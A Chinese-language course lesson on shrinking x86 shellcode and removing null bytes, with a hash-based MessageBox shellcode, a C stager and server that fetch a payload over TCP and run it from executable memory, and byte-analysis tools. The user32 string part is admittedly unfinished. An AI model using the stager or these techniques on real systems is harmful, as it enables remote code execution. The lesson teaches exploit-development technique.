# 课时06 - ShellCode精简字节数

## 课程目标
1. 掌握ShellCode体积优化的各种技术
2. 理解指令编码与空字节消除
3. 学习代码压缩和复用技巧
4. 实现最小化的功能ShellCode

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Opcode | Operation Code | 指令操作码 |
| NOP Sled | NOP Slide | 空指令滑板，用于增加命中率 |
| Egg Hunter | 蛋搜索器 | 搜索内存中特定标记的小型ShellCode |
| Staged | 分阶段 | 小加载器+大Payload的模式 |
| Stager | 阶段加载器 | 负责加载主Payload的小型代码 |
| Inline | 内联 | 将函数代码直接嵌入调用处 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| NASM | 精确控制指令 | 手动优化 |
| objdump | 查看指令编码 | 分析字节 |
| Python | 自动化分析 | 统计和测试 |
| x64dbg | 验证功能 | 确保正确性 |

## 技术原理

### 1. 指令长度对比

```
常见指令的不同编码方式：

设置寄存器为0:
  mov eax, 0     → B8 00 00 00 00  (5字节，4个空字节)
  xor eax, eax   → 31 C0           (2字节，无空字节) ✓
  sub eax, eax   → 29 C0           (2字节，无空字节)

设置寄存器为1:
  mov eax, 1     → B8 01 00 00 00  (5字节，3个空字节)
  xor eax, eax   → 31 C0           
  inc eax        → 40              (共3字节，无空字节) ✓

push 0:
  push 0         → 6A 00           (2字节，1个空字节)
  xor eax, eax   → 31 C0
  push eax       → 50              (共3字节，无空字节) ✓

小立即数:
  mov eax, 0xFF  → B8 FF 00 00 00  (5字节)
  push 0xFF      → 6A FF
  pop eax        → 58              (共3字节) ✓
```

### 2. 优化策略层次

```
Level 1: 指令替换
  - 消除空字节
  - 使用短编码指令
  
Level 2: 代码重构
  - 合并重复代码
  - 函数内联/提取
  
Level 3: 算法优化
  - 简化逻辑流程
  - 减少API调用

Level 4: 架构重设计
  - 分阶段加载
  - Egg Hunter模式
```

### 3. 常用优化技巧

| 技巧 | 原始 | 优化后 | 节省 |
|------|------|--------|------|
| 清零 | mov reg,0 | xor reg,reg | 3字节 |
| 小值 | mov reg,N | push N; pop | 2字节 |
| 调用 | call addr | push ret; jmp | 可变 |
| 字符串 | 数据段 | 栈构造 | 避免数据段 |
| 循环 | for循环 | loop指令 | 可变 |

## 代码实现

### 1. 优化前后对比

```nasm
; shellcode_optimize.asm
; ShellCode优化示例

BITS 32

; ========== 未优化版本 ==========
section .unoptimized

unopt_start:
    ; 1. 清零寄存器 - 未优化
    mov eax, 0              ; B8 00 00 00 00 (5字节)
    mov ebx, 0              ; BB 00 00 00 00 (5字节)
    mov ecx, 0              ; B9 00 00 00 00 (5字节)
    mov edx, 0              ; BA 00 00 00 00 (5字节)
    ; 总计: 20字节，16个空字节
    
    ; 2. 设置小值 - 未优化
    mov eax, 1              ; B8 01 00 00 00 (5字节)
    mov ebx, 2              ; BB 02 00 00 00 (5字节)
    ; 总计: 10字节，6个空字节
    
    ; 3. push 0 - 未优化
    push 0                  ; 6A 00 (2字节，1个空字节)
    push 0                  ; 6A 00 (2字节，1个空字节)
    ; 总计: 4字节，2个空字节
    
unopt_end:
    ; 未优化总计: 34字节，24个空字节

; ========== 优化后版本 ==========
section .optimized

opt_start:
    ; 1. 清零寄存器 - 优化
    xor eax, eax            ; 31 C0 (2字节)
    xor ebx, ebx            ; 31 DB (2字节)
    xor ecx, ecx            ; 31 C9 (2字节)
    xor edx, edx            ; 31 D2 (2字节)
    ; 总计: 8字节，0个空字节
    ; 节省: 12字节 (60%)
    
    ; 更激进: 使用cdq
    xor eax, eax            ; 31 C0 (2字节)
    cdq                     ; 99 (1字节) edx = 0
    ; 如果只需要eax和edx为0: 3字节
    
    ; 2. 设置小值 - 优化
    xor eax, eax            ; 31 C0
    inc eax                 ; 40     (3字节，eax=1)
    
    push 2                  ; 6A 02
    pop ebx                 ; 5B     (3字节，ebx=2)
    ; 总计: 6字节，0个空字节
    ; 节省: 4字节 (40%)
    
    ; 3. push 0 - 优化
    xor eax, eax            ; 31 C0 (2字节，只需执行一次)
    push eax                ; 50 (1字节)
    push eax                ; 50 (1字节)
    ; 总计: 4字节（如果已经有清零的寄存器则2字节）
    ; 节省: 消除了空字节

opt_end:
    ; 优化后总计: 约16字节，0个空字节
```

### 2. 极限优化的MessageBox ShellCode

```nasm
; tiny_msgbox.asm
; 极限优化的MessageBox ShellCode (x86)
; 目标: 最小体积，无空字节

BITS 32

global _start

_start:
    ; === 获取kernel32 (优化版) ===
    xor ecx, ecx            ; 31 C9
    mul ecx                 ; F7 E1 (eax=edx=0)
    mov eax, [fs:ecx+0x30]  ; 64 8B 41 30
    mov eax, [eax+0x0C]     ; 8B 40 0C
    mov esi, [eax+0x14]     ; 8B 70 14
    
.next_mod:
    lodsd                   ; AD (eax=[esi], esi+=4)
    xchg eax, esi           ; 96
    mov ebx, [esi+0x10]     ; 8B 5E 10 (DllBase)
    mov edi, [esi+0x28]     ; 8B 7E 28 (BaseDllName.Buffer)
    
    ; 检查是否kernel32 (简化检查)
    cmp byte [edi+0x0C], '3'; 80 7F 0C 33
    jne .next_mod           ; 75 F0
    
    ; ebx = kernel32
    
    ; === 获取函数 (优化: 复用代码) ===
    ; 计算GetProcAddress哈希并查找
    push 0xec0e4e8e         ; LoadLibraryA hash
    push ebx
    call find_func
    xchg eax, ebp           ; LoadLibraryA -> ebp
    
    push 0x7c0dfcaa         ; GetProcAddress hash
    push ebx
    call find_func
    xchg eax, edi           ; GetProcAddress -> edi
    
    ; === 加载user32.dll ===
    ; 使用栈构造字符串（避免数据段）
    xor eax, eax
    push eax                ; null terminator
    push 'l'                ; 使用单字符push需要技巧
    ; 更好的方式:
    push 0x006c6c64         ; "dll\0" (有空字节，需要处理)
    
    ; 无空字节版本:
    mov eax, 0x6c6c64ff
    shr eax, 8              ; eax = 0x006c6c64
    push eax
    push '.23r'             ; "r32."
    push 'esus'             ; 需要调整...
    
    ; 实际实现（简化）:
    push 0x61616161         ; 占位
    mov [esp], dword 'user'
    mov [esp+4], dword '32.d'
    mov [esp+8], word 'll'
    mov byte [esp+10], 0
    
    push esp
    call ebp                ; LoadLibraryA
    
    ; === 获取MessageBoxA ===
    push 0xbc4da2a8         ; MessageBoxA hash
    push eax
    call find_func
    
    ; === 调用MessageBoxA ===
    xor ecx, ecx
    push ecx                ; MB_OK
    push ecx                ; lpCaption
    push '!iH'              ; 简短消息
    mov [esp+2], cl         ; null终止
    push esp
    push ecx                ; hWnd
    call eax
    
    ; === 退出 ===
    push 0x73e2d87e         ; ExitProcess hash
    push ebx
    call find_func
    xor ecx, ecx
    push ecx
    call eax

; === 紧凑的函数查找 ===
find_func:
    pushad
    mov ebp, [esp+0x24]     ; 模块基址
    mov esi, [esp+0x28]     ; 目标哈希
    
    mov eax, [ebp+0x3C]
    mov ecx, [ebp+eax+0x78]
    add ecx, ebp            ; 导出表
    
    mov ebx, [ecx+0x20]
    add ebx, ebp            ; 名称表
    xor edx, edx            ; 索引
    
.find_loop:
    mov edi, [ebx+edx*4]
    add edi, ebp
    
    ; 计算ROR13哈希
    xor eax, eax
.hash_loop:
    ror eax, 0x0D
    add al, [edi]
    inc edi
    cmp byte [edi], 0
    jne .hash_loop
    
    cmp eax, esi
    je .found
    inc edx
    jmp .find_loop
    
.found:
    mov ebx, [ecx+0x24]
    add ebx, ebp
    movzx edx, word [ebx+edx*2]
    
    mov ebx, [ecx+0x1C]
    add ebx, ebp
    mov eax, [ebx+edx*4]
    add eax, ebp
    
    mov [esp+0x1C], eax     ; 存入popad后的eax位置
    popad
    ret 8
```

### 3. 分阶段ShellCode (Stager)

```c
// stager.c
// 小型分阶段加载器 - 下载并执行主Payload

#include <windows.h>
#include <stdio.h>

// 极简Stager ShellCode (约100字节目标)
// 功能: 连接服务器，接收并执行ShellCode

#pragma optimize("", off)
#pragma code_seg(".stager")

#ifndef _WIN64
__declspec(naked) void Stager() {
    __asm {
        ; === 初始化 ===
        pushad
        xor ebx, ebx
        mul ebx                     ; eax=edx=0
        
        ; === 获取kernel32 ===
        mov eax, fs:[0x30]
        mov eax, [eax+0x0C]
        mov eax, [eax+0x14]
        mov eax, [eax]
        mov eax, [eax]
        mov ebp, [eax+0x10]         ; ebp = kernel32
        
        ; === 使用哈希获取WSAStartup ===
        ; (简化: 假设ws2_32已加载)
        
        ; === 分配接收缓冲区 ===
        push 0x40                   ; PAGE_EXECUTE_READWRITE
        push 0x1000                 ; MEM_COMMIT
        push 0x10000                ; 64KB
        push ebx                    ; NULL
        
        ; 调用VirtualAlloc (假设地址已知或通过哈希获取)
        ; mov eax, VirtualAlloc_addr
        ; call eax
        
        ; === 连接并接收 ===
        ; socket -> connect -> recv 循环
        
        ; === 跳转执行 ===
        ; jmp eax (接收缓冲区)
        
        popad
        ret
    }
}
#endif

#pragma code_seg()
#pragma optimize("", on)

// C语言版本的Stager逻辑
void StagerLogic(const char* ip, WORD port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    // 连接服务器
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    // 接收Payload大小
    DWORD size;
    recv(sock, (char*)&size, 4, 0);
    
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // 接收Payload
    DWORD received = 0;
    while (received < size) {
        int n = recv(sock, (char*)mem + received, size - received, 0);
        if (n <= 0) break;
        received += n;
    }
    
    closesocket(sock);
    
    // 执行Payload
    ((void(*)())mem)();
}

// 演示Stager服务器
void StagerServer(WORD port, const char* payloadFile) {
    // 读取Payload
    HANDLE hFile = CreateFileA(payloadFile, GENERIC_READ, 0, NULL, 
                                OPEN_EXISTING, 0, NULL);
    DWORD payloadSize = GetFileSize(hFile, NULL);
    LPBYTE payload = (LPBYTE)malloc(payloadSize);
    DWORD read;
    ReadFile(hFile, payload, payloadSize, &read, NULL);
    CloseHandle(hFile);
    
    printf("[*] Loaded payload: %lu bytes\n", payloadSize);
    
    // 启动服务器
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 1);
    
    printf("[*] Waiting for stager connection on port %d...\n", port);
    
    SOCKET client = accept(srv, NULL, NULL);
    printf("[+] Stager connected!\n");
    
    // 发送Payload大小
    send(client, (char*)&payloadSize, 4, 0);
    
    // 发送Payload
    send(client, (char*)payload, payloadSize, 0);
    printf("[+] Sent %lu bytes\n", payloadSize);
    
    closesocket(client);
    closesocket(srv);
    WSACleanup();
    free(payload);
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("      Staged ShellCode Demo            \n");
    printf("========================================\n\n");
    
    if (argc >= 3 && strcmp(argv[1], "server") == 0) {
        StagerServer(4444, argv[2]);
    } else if (argc >= 3 && strcmp(argv[1], "client") == 0) {
        StagerLogic(argv[2], 4444);
    } else {
        printf("Usage:\n");
        printf("  Server: %s server <payload.bin>\n", argv[0]);
        printf("  Client: %s client <server_ip>\n", argv[0]);
    }
    
    return 0;
}
```

### 4. 空字节消除工具

```python
#!/usr/bin/env python3
# null_byte_eliminator.py
# 空字节检测和替换建议工具

import sys
import struct

# 空字节指令替换建议
REPLACEMENTS = {
    # mov reg, 0
    b'\xB8\x00\x00\x00\x00': ('mov eax, 0', 'xor eax, eax', b'\x31\xC0'),
    b'\xBB\x00\x00\x00\x00': ('mov ebx, 0', 'xor ebx, ebx', b'\x31\xDB'),
    b'\xB9\x00\x00\x00\x00': ('mov ecx, 0', 'xor ecx, ecx', b'\x31\xC9'),
    b'\xBA\x00\x00\x00\x00': ('mov edx, 0', 'xor edx, edx', b'\x31\xD2'),
    
    # mov reg, 1
    b'\xB8\x01\x00\x00\x00': ('mov eax, 1', 'xor eax, eax; inc eax', b'\x31\xC0\x40'),
    b'\xBB\x01\x00\x00\x00': ('mov ebx, 1', 'xor ebx, ebx; inc ebx', b'\x31\xDB\x43'),
    
    # push 0
    b'\x6A\x00': ('push 0', 'xor eax, eax; push eax (if eax free)', b'\x31\xC0\x50'),
    
    # call/jmp with small offset containing null
    b'\xE8\x00\x00\x00\x00': ('call +5 (relative)', 'use different offset', None),
}

def analyze_shellcode(data):
    """分析ShellCode中的空字节"""
    print(f"[*] Analyzing {len(data)} bytes\n")
    
    # 统计
    null_count = data.count(b'\x00')
    print(f"[*] Total null bytes: {null_count} ({100*null_count/len(data):.1f}%)")
    
    # 空字节位置
    print(f"\n[*] Null byte positions:")
    null_positions = []
    for i, b in enumerate(data):
        if b == 0:
            null_positions.append(i)
    
    # 分组显示
    groups = []
    if null_positions:
        start = null_positions[0]
        end = start
        for pos in null_positions[1:]:
            if pos == end + 1:
                end = pos
            else:
                groups.append((start, end))
                start = end = pos
        groups.append((start, end))
    
    for start, end in groups:
        if start == end:
            print(f"    [0x{start:04X}]")
        else:
            print(f"    [0x{start:04X} - 0x{end:04X}] ({end-start+1} bytes)")
    
    # 检查已知模式
    print(f"\n[*] Known patterns with null bytes:")
    for pattern, (orig, replacement, new_bytes) in REPLACEMENTS.items():
        count = data.count(pattern)
        if count > 0:
            print(f"    '{orig}' found {count} time(s)")
            print(f"        Replace with: '{replacement}'")
            if new_bytes:
                print(f"        New bytes: {new_bytes.hex()}")
    
    return null_count

def remove_nulls(data, aggressive=False):
    """尝试自动替换一些已知的空字节模式"""
    result = data
    
    # 简单替换
    simple_replacements = [
        (b'\xB8\x00\x00\x00\x00', b'\x31\xC0'),  # mov eax,0 -> xor eax,eax
        (b'\xBB\x00\x00\x00\x00', b'\x31\xDB'),  # mov ebx,0 -> xor ebx,ebx
        (b'\xB9\x00\x00\x00\x00', b'\x31\xC9'),  # mov ecx,0 -> xor ecx,ecx
        (b'\xBA\x00\x00\x00\x00', b'\x31\xD2'),  # mov edx,0 -> xor edx,edx
    ]
    
    for old, new in simple_replacements:
        if old in result:
            print(f"[+] Replacing {old.hex()} with {new.hex()}")
            result = result.replace(old, new)
    
    return result

def format_output(data, format_type='c'):
    """格式化输出"""
    if format_type == 'c':
        result = 'unsigned char shellcode[] = \n"'
        for i, b in enumerate(data):
            result += f'\\x{b:02X}'
            if (i + 1) % 16 == 0 and i < len(data) - 1:
                result += '"\n"'
        result += '";\n'
        return result
    elif format_type == 'nasm':
        result = 'shellcode:\n    db '
        for i, b in enumerate(data):
            result += f'0x{b:02X}'
            if (i + 1) % 8 == 0:
                result += '\n    db '
            elif i < len(data) - 1:
                result += ', '
        return result.rstrip(', \n    db ')
    return data.hex()

def main():
    if len(sys.argv) < 2:
        print("Usage: python null_byte_eliminator.py <shellcode.bin> [output.bin]")
        sys.exit(1)
    
    with open(sys.argv[1], 'rb') as f:
        data = f.read()
    
    null_count = analyze_shellcode(data)
    
    if null_count > 0 and len(sys.argv) >= 3:
        print(f"\n[*] Attempting automatic null removal...")
        cleaned = remove_nulls(data)
        new_null_count = cleaned.count(b'\x00')
        
        print(f"[*] Null bytes: {null_count} -> {new_null_count}")
        
        with open(sys.argv[2], 'wb') as f:
            f.write(cleaned)
        print(f"[+] Saved to: {sys.argv[2]}")
        
        print(f"\n{format_output(cleaned)}")

if __name__ == "__main__":
    main()
```

### 5. 体积统计工具

```c
// shellcode_stats.c
// ShellCode体积分析工具

#include <windows.h>
#include <stdio.h>

typedef struct {
    int totalBytes;
    int nullBytes;
    int uniqueBytes;
    int printableBytes;  // 0x20-0x7E
    int alphanumBytes;   // A-Z, a-z, 0-9
    int instructionCount; // 估算
} ShellcodeStats;

void AnalyzeShellcode(const unsigned char* code, size_t size, ShellcodeStats* stats) {
    memset(stats, 0, sizeof(ShellcodeStats));
    stats->totalBytes = (int)size;
    
    int byteCount[256] = {0};
    
    for (size_t i = 0; i < size; i++) {
        unsigned char b = code[i];
        byteCount[b]++;
        
        if (b == 0x00) stats->nullBytes++;
        if (b >= 0x20 && b <= 0x7E) stats->printableBytes++;
        if ((b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || (b >= '0' && b <= '9')) {
            stats->alphanumBytes++;
        }
    }
    
    for (int i = 0; i < 256; i++) {
        if (byteCount[i] > 0) stats->uniqueBytes++;
    }
    
    // 简单估算指令数（平均每条指令2.5字节）
    stats->instructionCount = (int)(size / 2.5);
}

void PrintStats(const char* name, ShellcodeStats* stats) {
    printf("\n=== %s ===\n", name);
    printf("Total size:       %d bytes\n", stats->totalBytes);
    printf("Null bytes:       %d (%.1f%%)\n", stats->nullBytes, 
           100.0 * stats->nullBytes / stats->totalBytes);
    printf("Unique bytes:     %d / 256\n", stats->uniqueBytes);
    printf("Printable bytes:  %d (%.1f%%)\n", stats->printableBytes,
           100.0 * stats->printableBytes / stats->totalBytes);
    printf("Alphanumeric:     %d (%.1f%%)\n", stats->alphanumBytes,
           100.0 * stats->alphanumBytes / stats->totalBytes);
    printf("Est. instructions: ~%d\n", stats->instructionCount);
    
    // 兼容性评估
    printf("\nCompatibility:\n");
    printf("  Null-free:      %s\n", stats->nullBytes == 0 ? "Yes" : "No");
    printf("  Alpha-only:     %s\n", stats->alphanumBytes == stats->totalBytes ? "Yes" : "No");
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("     ShellCode Size Analysis            \n");
    printf("========================================\n");
    
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }
    
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", argv[1]);
        return 1;
    }
    
    DWORD size = GetFileSize(hFile, NULL);
    unsigned char* code = (unsigned char*)malloc(size);
    DWORD read;
    ReadFile(hFile, code, size, &read, NULL);
    CloseHandle(hFile);
    
    ShellcodeStats stats;
    AnalyzeShellcode(code, size, &stats);
    PrintStats(argv[1], &stats);
    
    // 字节频率分布
    printf("\n=== Byte Frequency (Top 10) ===\n");
    int freq[256] = {0};
    for (DWORD i = 0; i < size; i++) {
        freq[code[i]]++;
    }
    
    // 找出最常见的10个字节
    for (int n = 0; n < 10; n++) {
        int maxIdx = 0, maxCount = 0;
        for (int i = 0; i < 256; i++) {
            if (freq[i] > maxCount) {
                maxCount = freq[i];
                maxIdx = i;
            }
        }
        if (maxCount > 0) {
            printf("  0x%02X: %d times (%.1f%%)\n", maxIdx, maxCount,
                   100.0 * maxCount / size);
            freq[maxIdx] = 0;
        }
    }
    
    free(code);
    return 0;
}
```

## 课后作业

### 作业1：手动优化练习
优化以下ShellCode片段，消除所有空字节并尽量减少体积：
```asm
mov eax, 0
mov ebx, 0
mov ecx, 0
push 0
push 0
mov eax, 0x12345678
```

### 作业2：实现Egg Hunter
编写一个小于50字节的Egg Hunter ShellCode。

### 作业3：体积挑战
尝试实现一个最小的MessageBox ShellCode，目标小于150字节。
